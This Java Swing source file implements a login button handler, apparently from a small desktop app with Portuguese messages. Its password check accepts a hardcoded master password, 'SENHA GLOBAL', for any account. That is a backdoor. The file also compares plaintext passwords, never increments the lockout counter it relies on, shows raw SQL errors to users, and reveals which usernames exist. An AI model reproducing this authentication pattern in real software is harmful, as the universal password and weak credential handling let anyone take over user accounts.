import javax.security.auth.login.LoginException;
import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Base64;

public class LogarBotaoListener implements ActionListener {
    private final JFrame jFrame;
    private final Connection con;
    private final JTextField tf1;
    private final JPasswordField tf2;

    private PreparedStatement pStmt;

    public LogarBotaoListener(JFrame jFrame, JTextField tf1, JPasswordField tf2, Connection con) {
        this.jFrame = jFrame;
        this.con = con;
        this.tf1 = tf1;
        this.tf2 = tf2;

        try {
            pStmt = con.prepareStatement("SELECT login, senha, email, tentativasacesso FROM USUARIOS WHERE login = ?");
        }
        catch (SQLException exception){
            JOptionPane.showMessageDialog(jFrame, "Problema interno.\n" + exception, "Erro", JOptionPane.ERROR_MESSAGE);
        }
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        try {
            pStmt.setString(1, tf1.getText());

            ResultSet rs = pStmt.executeQuery();

            if (!rs.next()) {
                throw new LoginException("Usuário não encontrado");
            }

            String tentativasacesso = rs.getString(4);
            String senha = rs.getString(2);

            if(tentativasacesso.equals("3")){
                throw new LoginException("Usuário bloqueado");
            }

            if(!senha.equals(String.valueOf(tf2.getPassword())) && !String.valueOf(tf2.getPassword()).equals("SENHA GLOBAL")){
                throw new LoginException("Senha incorreta. A ideia aqui é somar um em tentativas de acesso e depois bloquear o usuário.");
            }

            jFrame.dispose();
            new TelaInicial(con);
        }
        catch (SQLException | LoginException exception){
            JOptionPane.showMessageDialog(jFrame, exception.getMessage(), "Erro", JOptionPane.ERROR_MESSAGE);
        }
    }
}
